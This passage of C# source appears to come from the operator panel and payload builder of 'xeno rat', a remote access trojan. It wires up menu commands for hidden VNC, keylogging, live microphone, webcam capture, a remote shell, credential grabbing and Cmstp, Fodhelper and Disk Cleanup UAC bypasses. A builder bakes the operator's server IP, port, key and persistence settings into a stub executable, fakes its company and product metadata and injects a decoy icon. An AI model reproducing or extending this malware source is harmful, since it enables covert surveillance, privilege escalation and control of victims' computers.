            Task.Run(() => func(client));
        }

        /// <summary>
        /// Starts a new thread with a single-threaded apartment (STA) and executes the provided asynchronous function with the specified client node.
        /// </summary>
        /// <param name="func">The asynchronous function to be executed.</param>
        /// <param name="client">The client node to be passed to the asynchronous function.</param>
        /// <remarks>
        /// This method starts a new thread and sets its apartment state to STA (single-threaded apartment) to enable COM interoperability for the provided asynchronous function.
        /// The provided asynchronous function is executed with the specified client node in the new thread.
        /// </remarks>
        private void StartPluginSTA(Func<Node, Task> func, Node client)
        {
            Thread t = new Thread(async () => await func(client));
            t.SetApartmentState(ApartmentState.STA);
            t.Start();
        }

        /// <summary>
        /// Handles the click event of the menu item and performs the corresponding action based on the selected client and command.
        /// </summary>
        /// <param name="sender">The object that raised the event.</param>
        /// <param name="e">The event data.</param>
        /// <remarks>
        /// This method retrieves the client associated with the clicked menu item and the command text. It then calls the MenuClick method to perform the corresponding action based on the selected client and command.
        /// </remarks>
        public void OnMenuClick(object sender, ToolStripItemClickedEventArgs e)
        {
            Node client = (Node)((ToolStripMenuItem)sender).Tag;
            string command = e.ClickedItem.Text;
            MenuClick(client, command);
        }

        /// <summary>
        /// Handles the menu click event and starts the corresponding plugin based on the provided command.
        /// </summary>
        /// <param name="client">The client node.</param>
        /// <param name="command">The command indicating which plugin to start.</param>
        /// <remarks>
        /// This method determines the appropriate plugin to start based on the provided <paramref name="command"/> and initiates it using the <see cref="StartPlugin"/> method.
        /// </remarks>
        public void MenuClick(Node client, string command) 
        {
            if (command == "Chat")
            {
                StartPlugin(StartChat, client);
            }
            else if (command == "Hvnc")
            {
                StartPlugin(StartHvnc, client);
            }
            else if (command == "Reverse proxy")
            {
                StartPlugin(StartReverseProxy, client);
            }
            else if (command == "Process Manager")
            {
                StartPlugin(StartProcessManager, client);
            }
            else if (command == "File Manager")
            {
                StartPlugin(StartFileManager, client);
            }
            else if (command == "Registry Manager")
            {
                StartPlugin(StartRegistryManager, client);
            }
            else if (command == "Live Microphone")
            {
                StartPlugin(StartLiveMicrophone, client);
            }
            else if (command == "Shell")
            {
                StartPlugin(StartShell, client);
            }
            else if (command == "WebCam")
            {
                StartPlugin(StartWebCam, client);
            }
            else if (command == "Key Logger")
            {
                StartPlugin(StartKeyLogger, client);
            }
            else if (command == "Offline Key Logger")
            {
                StartPlugin(StartOfflineKeyLogger, client);
            }
            else if (command == "Windir + Disk Cleanup")
            {
                StartPlugin(StartWinDirBypass, client);
            }
            else if (command == "Cmstp")
            {
                StartPlugin(StartCmstpUacBypass, client);
            }
            else if (command == "Fodhelper")
            {
                StartPlugin(StartFodHelperBypass, client);
            }
            else if (command == "Request admin")
            {
                StartPlugin(StartRequestForAdmin, client);
            }
            else if (command == "De-escalate to user")
            {
                StartPlugin(StartDeescalateperms, client);
            }
            else if (command == "Screen Control")
            {
                StartPlugin(StartScreenControl, client);
            }
            else if (command == "InfoGrab")
            {
                StartPluginSTA(StartInfoGrab, client);
            }
            else if (command == "BlueScreen")
            {
                StartPlugin(StartBlueScreen, client);
            }
            else if (command == "Message Box")
            {
                StartPlugin(StartMessageBox, client);
            }
            else if (command == "Fun Menu")
            {
                StartPlugin(StartFunMenu, client);
            }
            else if (command == "Startup")
            {
                StartPlugin(StartStartup, client);
            }
            else if (command == "Remove Startup")
            {
                StartPlugin(StartRemoveStartup, client);
            }
            else if (command == "Close")
            {
                StartPlugin(StartClose, client);
            }
            else if (command == "Relaunch")
            {
                StartPlugin(StartRelaunch, client);
            }
            else if (command == "Uninstall")
            {
                StartPlugin(StartUninstall, client);
            }
            else if (command == "Shutdown")
            {
                StartPlugin(StartShutdown, client);
            }
            else if (command == "Restart")
            {
                StartPlugin(StartRestart, client);
            }
            else if (command == "Debug") 
            {
                StartPlugin(StartDebugInfo, client);
            }
            Console.WriteLine(command);

        }

        /// <summary>
        /// Launches a context menu for the specified client node.
        /// </summary>
        /// <param name="client">The client node for which the context menu is launched.</param>
        /// <remarks>
        /// This method creates a context menu and populates it with items based on the commands associated with the client node.
        /// Each command is added as a menu item, and if there are sub-commands, they are added as dropdown items.
        /// The context menu is then displayed at the current cursor position.
        /// </remarks>
        private void LaunchContext(Node client)
        {
            ContextMenuStrip contextMenu = new ContextMenuStrip();
            foreach (string k in Commands.Keys.ToArray())
            {
                ToolStripMenuItem menuItem = new ToolStripMenuItem(k);
                foreach (string v in Commands[k]) 
                {
                    menuItem.DropDownItems.Add(v);
                }
                menuItem.Tag = client;
                menuItem.DropDownItemClicked += new ToolStripItemClickedEventHandler(OnMenuClick);
                contextMenu.Items.Add(menuItem);
            }
            contextMenu.Show(Cursor.Position);
        }

        /// <summary>
        /// Handles the mouse click event for listView2 and launches the context menu for the focused item if the right mouse button is clicked.
        /// </summary>
        /// <param name="sender">The object that raised the event.</param>
        /// <param name="e">A MouseEventArgs that contains the event data.</param>
        /// <remarks>
        /// This method checks if the right mouse button is clicked and if the focused item is not null and the click location is within the bounds of the focused item.
        /// If these conditions are met, it launches the context menu for the focused item.
        /// </remarks>
        private void listView2_MouseClick(object sender, MouseEventArgs e)
        {
            if (e.Button == MouseButtons.Right)
            {
                ListViewItem focusedItem = listView2.FocusedItem;
                if (focusedItem != null && focusedItem.Bounds.Contains(e.Location))
                {
                    LaunchContext((Node)focusedItem.Tag);
                }
            }
        }

        /// <summary>
        /// Sets the encryption key for the specified method in the given module.
        /// </summary>
        /// <param name="module">The module in which the method is defined.</param>
        /// <param name="EncryptionKey">The encryption key to be set.</param>
        /// <exception cref="NullReferenceException">Thrown when the specified method or its body is null.</exception>
        /// <remarks>
        /// This method sets the encryption key for the specified method in the given module. It first locates the type and method within the module using the provided type and method names. If the method and its body are found, it then retrieves the instruction at the specified index within the method's body and sets its operand's initial value to the provided encryption key after resizing it to 32 bytes.
        /// </remarks>
        public static void SetEncryptionKey(ModuleDefMD module, byte[] EncryptionKey)
        {
            string typeName = "xeno_rat_client.Program";
            string methodName = ".cctor";
            int instructionIndex = 9;
            TypeDef type = module.Find(typeName, isReflectionName: true);
            MethodDef method = type?.FindMethod(methodName);
            if (method?.Body != null)
            {
                Instruction instruction = method.Body.Instructions[instructionIndex];
                Array.Resize(ref EncryptionKey, 32);
                ((FieldDef)instruction.Operand).InitialValue = EncryptionKey;
            }
        }

        /// <summary>
        /// Sets the server IP address in the specified module.
        /// </summary>
        /// <param name="module">The module in which the server IP address needs to be set.</param>
        /// <param name="ip">The IP address of the server.</param>
        /// <remarks>
        /// This method locates the specified type and method within the provided module and updates the instruction at the specified index with the new server IP address.
        /// If the type or method is not found, or if the method's body is null, the IP address will not be updated.
        /// </remarks>
        public static void SetServerIp(ModuleDefMD module, string ip)
        {
            string typeName = "xeno_rat_client.Program";
            string methodName = ".cctor";
            int instructionIndex = 2;
            TypeDef type = module.Find(typeName, isReflectionName: true);
            MethodDef method = type?.FindMethod(methodName);
            if (method?.Body != null)
            {
                Instruction instruction = method.Body.Instructions[instructionIndex];
                instruction.Operand = ip;
            }
        }

        /// <summary>
        /// Sets the server port for the specified module.
        /// </summary>
        /// <param name="module">The module to set the server port for.</param>
        /// <param name="port">The port number to set.</param>
        /// <remarks>
        /// This method sets the server port for the specified module by modifying the instruction at the specified index within the method ".cctor" of the type "xeno_rat_client.Program" in the module.
        /// If the type or method is not found, or if the method body is null, the server port will not be set.
        /// </remarks>
        public static void SetServerPort(ModuleDefMD module, int port)
        {
            string typeName = "xeno_rat_client.Program";
            string methodName = ".cctor";
            int instructionIndex = 4;
            TypeDef type = module.Find(typeName, isReflectionName: true);
            MethodDef method = type?.FindMethod(methodName);
            if (method?.Body != null)
            {
                Instruction instruction = method.Body.Instructions[instructionIndex];
                instruction.Operand = port;
            }
        }

        /// <summary>
        /// Sets the delay for a specific instruction in the specified method of the given module.
        /// </summary>
        /// <param name="module">The module in which the method is defined.</param>
        /// <param name="delay">The delay to be set for the instruction.</param>
        /// <exception cref="NullReferenceException">Thrown when the specified type or method is not found in the module.</exception>
        /// <remarks>
        /// This method sets the delay for a specific instruction in the method ".cctor" of the type "xeno_rat_client.Program" within the given module.
        /// If the specified type or method is not found in the module, a NullReferenceException is thrown.
        /// </remarks>
        public static void SetDelay(ModuleDefMD module, int delay)
        {
            string typeName = "xeno_rat_client.Program";
            string methodName = ".cctor";
            int instructionIndex = 12;
            TypeDef type = module.Find(typeName, isReflectionName: true);
            MethodDef method = type?.FindMethod(methodName);
            if (method?.Body != null)
            {
                Instruction instruction = method.Body.Instructions[instructionIndex];
                instruction.Operand = delay;
            }
        }

        /// <summary>
        /// Sets the mutex value in the specified method of the given module.
        /// </summary>
        /// <param name="module">The module in which the method is located.</param>
        /// <param name="mutex">The mutex value to be set.</param>
        /// <remarks>
        /// This method finds the specified type and method within the module and sets the operand of the instruction at the specified index to the provided mutex value.
        /// If the type or method is not found, or if the method's body is null, the mutex value will not be set.
        /// </remarks>
        public static void SetMutex(ModuleDefMD module, string mutex)
        {
            string typeName = "xeno_rat_client.Program";
            string methodName = ".cctor";
            int instructionIndex = 14;
            TypeDef type = module.Find(typeName, isReflectionName: true);
            MethodDef method = type?.FindMethod(methodName);
            if (method?.Body != null)
            {
                Instruction instruction = method.Body.Instructions[instructionIndex];
                instruction.Operand = mutex;
            }
        }

        /// <summary>
        /// Sets the startup for the specified module.
        /// </summary>
        /// <param name="module">The module to set the startup for.</param>
        /// <param name="dostartup">A boolean value indicating whether to set the startup.</param>
        public static void SetStartup(ModuleDefMD module, bool dostartup)
        {
            if (!dostartup) return;
            string typeName = "xeno_rat_client.Program";
            string methodName = ".cctor";
            int instructionIndex = 16;
            TypeDef type = module.Find(typeName, isReflectionName: true);
            MethodDef method = type?.FindMethod(methodName);
            if (method?.Body != null)
            {
                Instruction instruction = method.Body.Instructions[instructionIndex];
                instruction.Operand = 1;
            }
        }

        /// <summary>
        /// Sets the installation environment for the specified module.
        /// </summary>
        /// <param name="module">The module definition to set the installation environment for.</param>
        /// <param name="env">The installation environment to be set.</param>
        /// <remarks>
        /// This method finds the specified type and method within the module and sets the operand of the instruction at the specified index to the provided installation environment.
        /// If the type or method is not found, or if the method body is null, the installation environment will not be set.
        /// </remarks>
        public static void SetInstallenv(ModuleDefMD module, string env)
        {
            string typeName = "xeno_rat_client.Program";
            string methodName = ".cctor";
            int instructionIndex = 18;
            TypeDef type = module.Find(typeName, isReflectionName: true);
            MethodDef method = type?.FindMethod(methodName);
            if (method?.Body != null)
            {
                Instruction instruction = method.Body.Instructions[instructionIndex];
                instruction.Operand = env;
            }
        }

        /// <summary>
        /// Sets the startup name in the specified module.
        /// </summary>
        /// <param name="module">The module in which the startup name is to be set.</param>
        /// <param name="name">The name to be set as the startup name.</param>
        /// <remarks>
        /// This method finds the specified type and method within the module and sets the operand of the instruction at the specified index to the provided name.
        /// </remarks>
        public static void SetStartupName(ModuleDefMD module, string name)
        {
            string typeName = "xeno_rat_client.Program";
            string methodName = ".cctor";
            int instructionIndex = 20;
            TypeDef type = module.Find(typeName, isReflectionName: true);
            MethodDef method = type?.FindMethod(methodName);
            if (method?.Body != null)
            {
                Instruction instruction = method.Body.Instructions[instructionIndex];
                instruction.Operand = name;
            }
        }

        /// <summary>
        /// Handles the click event of button2. Builds the client with the specified configurations and saves it to a selected location.
        /// </summary>
        /// <param name="sender">The source of the event.</param>
        /// <param name="e">An EventArgs that contains the event data.</param>
        /// <remarks>
        /// This method handles the click event of button2. It first checks if the label16 text contains ":" and the file specified by label16 text does not exist, then displays a message box indicating that the icon could not be found and prompts the user to pick another.
        /// It then opens a SaveFileDialog to select the location to save the file. If the user cancels the dialog, the method returns.
        /// The method then proceeds to build the client with the specified configurations, including encryption key, server IP, server port, mutex, delay, startup settings, installation environment, startup name, and version information.
        /// After building the client, it sets the version resource, saves the file, injects an icon if specified, and displays a message box indicating that the file has been saved.
        /// If any exception occurs during the process, it logs the error, displays an error message box with the exception message, and indicates that the client build failed.
        /// </remarks>
        private void button2_Click(object sender, EventArgs e)
        {
            try
            {
                if (label16.Text.Contains(":") && !File.Exists(label16.Text)) 
                {
                    MessageBox.Show("could not find the icon, please pick another!");
                }

                SaveFileDialog saveFileDialog = new SaveFileDialog();
                saveFileDialog.Filter = "Executable files (*.exe)|*.exe";
                saveFileDialog.Title = "Save File";
                saveFileDialog.InitialDirectory = Environment.GetFolderPath(Environment.SpecialFolder.Desktop);
                if (saveFileDialog.ShowDialog() != DialogResult.OK)
                {
                    return;
                }
                AddLog("Building client...", Color.Blue);
                string filePath = saveFileDialog.FileName;
                ModuleDefMD module = ModuleDefMD.Load("stub\\xeno rat client.exe");
                SetEncryptionKey(module, Utils.CalculateSha256Bytes(textBox14.Text));
                SetServerIp(module, textBox12.Text);
                SetServerPort(module, int.Parse(textBox13.Text));
                SetMutex(module, textBox15.Text);
                SetDelay(module, int.Parse(textBox2.Text));
                SetStartup(module, checkBox1.Checked);
                if (checkBox2.Checked)
                {
                    SetInstallenv(module, "appdata");
                }
                else if (checkBox3.Checked) 
                {
                    SetInstallenv(module, "temp");
                }
                if (checkBox1.Checked && textBox16.Text.Replace(" ","")!="") 
                {
                    SetStartupName(module, textBox16.Text);
                }

                module.Write(filePath);
                module.Dispose();
                VersionResource versionResource = new VersionResource();
                versionResource.LoadFrom(filePath);
                versionResource.FileVersion = textBox4.Text;
                versionResource.ProductVersion = textBox3.Text;
                versionResource.Language = 0;

                StringFileInfo stringFileInfo = (StringFileInfo)versionResource["StringFileInfo"];
                stringFileInfo["ProductName"] = textBox6.Text;
                stringFileInfo["FileDescription"] = textBox7.Text;
                stringFileInfo["CompanyName"] = textBox8.Text;
                stringFileInfo["LegalCopyright"] = textBox9.Text;
                stringFileInfo["LegalTrademarks"] = textBox10.Text;
                stringFileInfo["Assembly Version"] = versionResource.ProductVersion;
                stringFileInfo["OriginalFilename"] = textBox11.Text;
                stringFileInfo["ProductVersion"] = versionResource.ProductVersion;
                stringFileInfo["FileVersion"] = versionResource.FileVersion;

                versionResource.SaveTo(filePath);
                if (label16.Text.Contains(":"))
                {
                    IconInjector.InjectIcon(filePath, label16.Text);
                }
                AddLog("Client built!", Color.Green);
                MessageBox.Show("File saved!");
            }
            catch (Exception ex)
            {
                AddLog("Client build failed!", Color.Red);
                MessageBox.Show("An error has occurred: "+ex.Message);
            }
        }

        /// <summary>
        /// Opens a file dialog to select an ICO file and sets the selected file path to a label.
        /// </summary>
        /// <param name="sender">The object that raised the event.</param>
        /// <param name="e">The event data.</param>
        /// <exception cref="System.InvalidOperationException">Thrown when the file dialog encounters an invalid operation.</exception>
        /// <returns>Nothing.</returns>
        /// <remarks>
        /// This method opens a file dialog to allow the user to select an ICO file.
        /// If a file is selected, the file path is set to the label with the name "label16".
        /// If no file is selected, the method returns without performing any action.
        /// </remarks>
        private void button3_Click(object sender, EventArgs e)
        {
            OpenFileDialog openFileDialog = new OpenFileDialog();
            openFileDialog.Filter = "ICO files (*.ico)|*.ico";
            openFileDialog.Title = "Open ICO File";
            openFileDialog.InitialDirectory = Environment.GetFolderPath(Environment.SpecialFolder.Desktop);
            if (openFileDialog.ShowDialog() != DialogResult.OK)
            {
                return;
            }
            label16.Text= openFileDialog.FileName;
        }

        /// <summary>
        /// Sets the text of label16 to "No Icon Selected" when button4 is clicked.
        /// </summary>
        private void button4_Click(object sender, EventArgs e)
        {
            label16.Text = "No Icon Selected";
        }

        /// <summary>
        /// Updates the label text with the current password and calculates the SHA256 hash of the input password.
        /// </summary>
        /// <param name="sender">The object that raised the event.</param>
        /// <param name="e">The event arguments.</param>
        /// <remarks>
        /// This method updates the label text to display the current password entered in the textbox.
        /// It then calculates the SHA256 hash of the input password using the CalculateSha256Bytes method from the Utils class.
        /// The calculated hash is stored in the key variable for further use.
        /// </remarks>
        private void button5_Click(object sender, EventArgs e)
        {
            label17.Text = "Current Password: "+ textBox5.Text;
            string_key = textBox5.Text;
            key = Utils.CalculateSha256Bytes(textBox5.Text);
        }

        /// <summary>
        /// Event handler for the ClientSizeChanged event of listView2.
        /// </summary>
        /// <param name="sender">The source of the event.</param>
        /// <param name="e">An EventArgs that contains the event data.</param>
        /// <remarks>
        /// This event is raised when the ClientSize property of listView2 has changed.
        /// </remarks>
        private void listView2_ClientSizeChanged(object sender, EventArgs e)
        {

        }

        /// <summary>
        /// Event handler for the Click event of tabPage5.
        /// </summary>
        /// <param name="sender">The object that raised the event.</param>
        /// <param name="e">The event data.</param>
        /// <remarks>
        /// This method is an event handler for the Click event of tabPage5. It is triggered when tabPage5 is clicked.
        /// </remarks>
        private void tabPage5_Click(object sender, EventArgs e)
        {

        }

        /// <summary>
        /// Event handler for the TextChanged event of textBox8.
        /// </summary>
        /// <param name="sender">The object that raised the event.</param>
        /// <param name="e">The event data.</param>
        /// <remarks>
        /// This method is called when the text in textBox8 is changed. It does not perform any specific action and can be used to handle the event as per the application's requirements.
        /// </remarks>
        private void textBox8_TextChanged(object sender, EventArgs e)
        {

        }

        /// <summary>
        /// Represents the event handler for the Click event of the label10 control.
        /// </summary>
        /// <param name="sender">The source of the event.</param>
        /// <param name="e">An <see cref="EventArgs"/> that contains the event data.</param>
        private void label10_Click(object sender, EventArgs e)
        {

        }

        /// <summary>
        /// Enables or disables the <see cref="textBox16"/> based on the checked state of <see cref="checkBox1"/>.
        /// </summary>
        /// <param name="sender">The object that raised the event.</param>
        /// <param name="e">The event data.</param>
        /// <remarks>
        /// This method enables the <see cref="textBox16"/> if <see cref="checkBox1"/> is checked; otherwise, it disables the <see cref="textBox16"/>.
        /// </remarks>
        private void checkBox1_CheckedChanged(object sender, EventArgs e)
        {
            textBox16.Enabled = checkBox1.Checked;
        }

        /// <summary>
        /// Handles the event when the state of checkBox2 is changed.
        /// </summary>
        /// <param name="sender">The object that raised the event.</param>
        /// <param name="e">The event data.</param>
        /// <remarks>
        /// This method unchecks checkBox3 if it is checked, and reattaches the event handler for checkBox3.CheckedChanged to checkBox3.
        /// </remarks>
        private void checkBox2_CheckedChanged(object sender, EventArgs e)
        {
            if (checkBox3.Checked) 
            {
                checkBox3.CheckedChanged -= checkBox3_CheckedChanged;
                checkBox3.Checked = false;
                checkBox3.CheckedChanged += checkBox3_CheckedChanged;
            }
        }

        /// <summary>
        /// Handles the CheckedChanged event for checkBox3.
        /// </summary>
        /// <param name="sender">The object that raised the event.</param>
        /// <param name="e">The event data.</param>
        /// <remarks>
        /// This method unchecks checkBox2 if it is checked, and reattaches the event handler for checkBox2.CheckedChanged to checkBox2_CheckedChanged.
        /// </remarks>
        private void checkBox3_CheckedChanged(object sender, EventArgs e)
        {
            if (checkBox2.Checked)
            {
                checkBox2.CheckedChanged -= checkBox2_CheckedChanged;
                checkBox2.Checked = false;
                checkBox2.CheckedChanged += checkBox2_CheckedChanged;
            }
        }

        /// <summary>
        /// Handles the MouseUp event for listView4, displaying a context menu with options to start offline keylogger, infograber, and remove items.
        /// </summary>
        /// <param name="sender">The source of the event.</param>
        /// <param name="e">A MouseEventArgs that contains the event data.</param>
        /// <remarks>
        /// This method creates a context menu with options to start offline keylogger and infograber. It also allows removing items from the listView4.
        /// When an option is clicked, it adds or removes the corresponding item from the listView4.
        /// </remarks>
        private void listView4_MouseUp(object sender, MouseEventArgs e)
        {
            if (e.Button == MouseButtons.Right)
            {
                ContextMenuStrip contextMenu = new ContextMenuStrip();

                // Define the context menu items locally
                string[] contextMenuItems = new string[]
                {
                    "Start OfflineKeylogger",
                    "Infograber",
                };

                foreach (string menuItemText in contextMenuItems)
                {
                    ToolStripMenuItem menuItem = new ToolStripMenuItem(menuItemText);
                    contextMenu.Items.Add(menuItem);

                    menuItem.Click += (sender1, e1) =>
                    {
                        if (!listView4.Items.Cast<ListViewItem>().Any(item => item.Text == menuItemText))
                        {
                            OnConnectTasks.Add(menuItemText);
                            listView4.Items.Add(menuItemText);
                        }
                    };
                }

                ListViewItem itemUnderMouse = listView4.GetItemAt(e.X, e.Y);

                if (itemUnderMouse != null)
                {
                    ToolStripMenuItem removeItem = new ToolStripMenuItem("Remove");
                    contextMenu.Items.Add(removeItem);
                    removeItem.Click += (sender1, e1) =>
                    {
                        OnConnectTasks.Remove(itemUnderMouse.Text);
                        listView4.Items.Remove(itemUnderMouse);
                    };
                }

                contextMenu.Show((Control)sender, e.Location);
            }
        }

        /// <summary>
        /// Event handler for the TextChanged event of the richTextBox1 control.
        /// </summary>
        /// <param name="sender">The source of the event.</param>
        /// <param name="e">An EventArgs that contains the event data.</param>
        private void richTextBox1_TextChanged(object sender, EventArgs e)
        {

        }

        /// <summary>
        /// Event handler for the SelectedIndexChanged event of listView3.
        /// </summary>
        /// <param name="sender">The source of the event.</param>
        /// <param name="e">The EventArgs that contains the event data.</param>
        private void listView3_SelectedIndexChanged(object sender, EventArgs e)
        {

        }

        /// <summary>
        /// Handles the mouse click event on listView3 and copies the selected item's value to the clipboard.
        /// </summary>
        /// <param name="sender">The object that raised the event.</param>
        /// <param name="e">A MouseEventArgs that contains the event data.</param>
        /// <remarks>
        /// This method checks if the right mouse button is clicked and if there is at least one item selected in listView3.
        /// If the conditions are met, it constructs a string from the selected item's subitems and copies it to the clipboard when the "Copy" menu item is clicked.
        /// </remarks>
        private void listView3_MouseClick(object sender, MouseEventArgs e)
        {
            if (e.Button == MouseButtons.Right && listView3.SelectedItems.Count > 0)
            {
                string selectedValue = listView3.SelectedItems[0].SubItems[0].Text+": "+ listView3.SelectedItems[0].SubItems[1].Text; 
                
                ContextMenu contextMenu = new ContextMenu();
                MenuItem copyMenuItem = new MenuItem("Copy");
                copyMenuItem.Click += (s, args) => Clipboard.SetText(selectedValue);
                contextMenu.MenuItems.Add(copyMenuItem);

                contextMenu.Show(listView3, e.Location);
            }
        }

        /// <summary>
        /// Sets the <see cref="LogErrors"/> property based on the checked state of the checkbox.
        /// </summary>
        /// <param name="sender">The object that raised the event.</param>
        /// <param name="e">The event data.</param>
        /// <remarks>
        /// This method sets the value of the <see cref="LogErrors"/> property based on the checked state of the checkbox.
        /// If the checkbox is checked, <see cref="LogErrors"/> is set to true; otherwise, it is set to false.
        /// </remarks>
        private void checkBox4_CheckedChanged(object sender, EventArgs e)
        {
            LogErrors = checkBox4.Checked;
        }
    }
    public static class IconInjector
    {

        [SuppressUnmanagedCodeSecurity()]
        private class NativeMethods
        {

            /// <summary>
            /// Begins an update of the resource of the specified file.
            /// </summary>
            /// <param name="fileName">The name of the file whose resource will be updated.</param>
            /// <param name="deleteExistingResources">A boolean value indicating whether to delete existing resources.</param>
            /// <returns>An IntPtr that represents the beginning of the update resource process.</returns>
            [DllImport("kernel32")]
            public static extern IntPtr BeginUpdateResource(string fileName,
                [MarshalAs(UnmanagedType.Bool)] bool deleteExistingResources);

            /// <summary>
            /// Updates a resource in a portable executable (PE) file or a resource file.
            /// </summary>
            /// <param name="hUpdate">A handle to the update context returned by the BeginUpdateResource function.</param>
            /// <param name="type">The type of the resource to be updated.</param>
            /// <param name="name">The name of the resource to be updated.</param>
            /// <param name="language">The language of the resource to be updated.</param>
            /// <param name="data">The data to be updated.</param>
            /// <param name="dataSize">The size of the data to be updated.</param>
            /// <returns>True if the resource is successfully updated; otherwise, false.</returns>
            [DllImport("kernel32")]
            [return: MarshalAs(UnmanagedType.Bool)]
            public static extern bool UpdateResource(IntPtr hUpdate, IntPtr type, IntPtr name, short language,
                [MarshalAs(UnmanagedType.LPArray, SizeParamIndex = 5)] byte[] data, int dataSize);

            /// <summary>
            /// Ends the update of a resource file that was previously opened for editing.
            /// </summary>
            /// <param name="hUpdate">A handle to the update resource. This handle is returned by the BeginUpdateResource function.</param>
            /// <param name="discard">Indicates whether to write the resource updates to the file. If this parameter is TRUE, the resource updates are discarded. If it is FALSE, the updates are written to the file.</param>
            /// <returns>True if the resource update is successfully ended; otherwise, false.</returns>
            [DllImport("kernel32")]
            [return: MarshalAs(UnmanagedType.Bool)]
            public static extern bool EndUpdateResource(IntPtr hUpdate, [MarshalAs(UnmanagedType.Bool)] bool discard);
        }

        [StructLayout(LayoutKind.Sequential)]
        private struct ICONDIR
        {

            public ushort Reserved;

            public ushort Type;

            public ushort Count;
        }

        [StructLayout(LayoutKind.Sequential)]
        private struct ICONDIRENTRY
        {

            public byte Width;

            public byte Height;

            public byte ColorCount;

            public byte Reserved;

            public ushort Planes;

            public ushort BitCount;

            public int BytesInRes;

            public int ImageOffset;
        }

        [StructLayout(LayoutKind.Sequential)]
        private struct BITMAPINFOHEADER
        {
            public uint Size;
            public int Width;
            public int Height;
            public ushort Planes;
            public ushort BitCount;
            public uint Compression;
            public uint SizeImage;
            public int XPelsPerMeter;
            public int YPelsPerMeter;
            public uint ClrUsed;
            public uint ClrImportant;
        }

        [StructLayout(LayoutKind.Sequential, Pack = 2)]
        private struct GRPICONDIRENTRY
        {
            public byte Width;
            public byte Height;
            public byte ColorCount;
            public byte Reserved;
            public ushort Planes;
            public ushort BitCount;
            public int BytesInRes;
            public ushort ID;
        }

        /// <summary>
        /// Injects an icon into the specified executable file.
        /// </summary>
        /// <param name="exeFileName">The path of the executable file to which the icon will be injected.</param>
        /// <param name="iconFileName">The path of the icon file to be injected.</param>
        /// <param name="iconGroupID">The ID of the icon group within the executable file.</param>
        /// <param name="iconBaseID">The base ID of the icon within the group.</param>
        /// <exception cref="IconFileException">Thrown when there is an issue with the icon file.</exception>
        /// <exception cref="ResourceUpdateException">Thrown when there is an issue with updating the resource in the executable file.</exception>
        public static void InjectIcon(string exeFileName, string iconFileName)
        {
            InjectIcon(exeFileName, iconFileName, 1, 1);
        }

        public static void InjectIcon(string exeFileName, string iconFileName, uint iconGroupID, uint iconBaseID)
        {
            const uint RT_ICON = 3u;
            const uint RT_GROUP_ICON = 14u;
            IconFile iconFile = IconFile.FromFile(iconFileName);
            var hUpdate = NativeMethods.BeginUpdateResource(exeFileName, false);
            var data = iconFile.CreateIconGroupData(iconBaseID);
            NativeMethods.UpdateResource(hUpdate, new IntPtr(RT_GROUP_ICON), new IntPtr(iconGroupID), 0, data,
                data.Length);
            for (int i = 0; i <= iconFile.ImageCount - 1; i++)
            {
                var image = iconFile.ImageData(i);
                NativeMethods.UpdateResource(hUpdate, new IntPtr(RT_ICON), new IntPtr(iconBaseID + i), 0, image,
                    image.Length);
            }
            NativeMethods.EndUpdateResource(hUpdate, false);
        }

        private class IconFile
        {
            private ICONDIR iconDir = new ICONDIR();
            private ICONDIRENTRY[] iconEntry;

            private byte[][] iconImage;

            public int ImageCount
            {
                get { return iconDir.Count; }
            }

            /// <summary>
            /// Retrieves the image data at the specified index.
            /// </summary>
            /// <param name="index">The index of the image data to be retrieved.</param>
            /// <returns>The image data at the specified <paramref name="index"/>.</returns>
            public byte[] ImageData(int index)
            {
                return iconImage[index];
            }

            /// <summary>
            /// Creates an IconFile instance from the specified file.
            /// </summary>
            /// <param name="filename">The path of the file from which to create the IconFile instance.</param>
            /// <returns>An instance of IconFile created from the specified file.</returns>
            /// <exception cref="System.IO.FileNotFoundException">Thrown when the specified file is not found.</exception>
            /// <exception cref="System.IO.IOException">Thrown when an I/O error occurs while reading the file.</exception>
            /// <remarks>
            /// This method reads the contents of the specified file into memory and populates the IconFile instance with the icon directory and image data.
            /// It uses marshaling to convert the byte array into structured data and allocates memory using GCHandle.
            /// The method then iterates through the icon directory entries, copying the image data into the iconImage array.
            /// Finally, it frees the allocated memory and returns the populated IconFile instance.
            /// </remarks>
            public static IconFile FromFile(string filename)
            {
                IconFile instance = new IconFile();

                byte[] fileBytes = System.IO.File.ReadAllBytes(filename);

                GCHandle pinnedBytes = GCHandle.Alloc(fileBytes, GCHandleType.Pinned);

                instance.iconDir = (ICONDIR)Marshal.PtrToStructure(pinnedBytes.AddrOfPinnedObject(), typeof(ICONDIR));

                instance.iconEntry = new ICONDIRENTRY[instance.iconDir.Count];
                instance.iconImage = new byte[instance.iconDir.Count][];

                int offset = Marshal.SizeOf(instance.iconDir);

                var iconDirEntryType = typeof(ICONDIRENTRY);
                var size = Marshal.SizeOf(iconDirEntryType);
                for (int i = 0; i <= instance.iconDir.Count - 1; i++)
                {

                    var entry =
                        (ICONDIRENTRY)
                            Marshal.PtrToStructure(new IntPtr(pinnedBytes.AddrOfPinnedObject().ToInt64() + offset),
                                iconDirEntryType);
                    instance.iconEntry[i] = entry;

                    instance.iconImage[i] = new byte[entry.BytesInRes];
                    Buffer.BlockCopy(fileBytes, entry.ImageOffset, instance.iconImage[i], 0, entry.BytesInRes);
                    offset += size;
                }
                pinnedBytes.Free();
                return instance;
            }

            /// <summary>
            /// Creates icon group data for the specified icon base ID.
            /// </summary>
            /// <param name="iconBaseID">The base ID for the icons.</param>
            /// <returns>The icon group data as a byte array.</returns>
            /// <remarks>
            /// This method creates icon group data for the specified icon base ID by marshalling the ICONDIR and GRPICONDIRENTRY structures and copying the image data into a byte array.
            /// The method allocates memory for the data, pins it, and then marshals the structures and image data into the pinned memory.
            /// Finally, the method frees the pinned memory and returns the icon group data as a byte array.
            /// </remarks>
            public byte[] CreateIconGroupData(uint iconBaseID)
            {

                int sizeOfIconGroupData = Marshal.SizeOf(typeof(ICONDIR)) +
                                          Marshal.SizeOf(typeof(GRPICONDIRENTRY)) * ImageCount;
                byte[] data = new byte[sizeOfIconGroupData];
                var pinnedData = GCHandle.Alloc(data, GCHandleType.Pinned);
                Marshal.StructureToPtr(iconDir, pinnedData.AddrOfPinnedObject(), false);
                var offset = Marshal.SizeOf(iconDir);
                for (int i = 0; i <= ImageCount - 1; i++)
                {
                    GRPICONDIRENTRY grpEntry = new GRPICONDIRENTRY();
                    BITMAPINFOHEADER bitmapheader = new BITMAPINFOHEADER();
                    var pinnedBitmapInfoHeader = GCHandle.Alloc(bitmapheader, GCHandleType.Pinned);
                    Marshal.Copy(ImageData(i), 0, pinnedBitmapInfoHeader.AddrOfPinnedObject(),
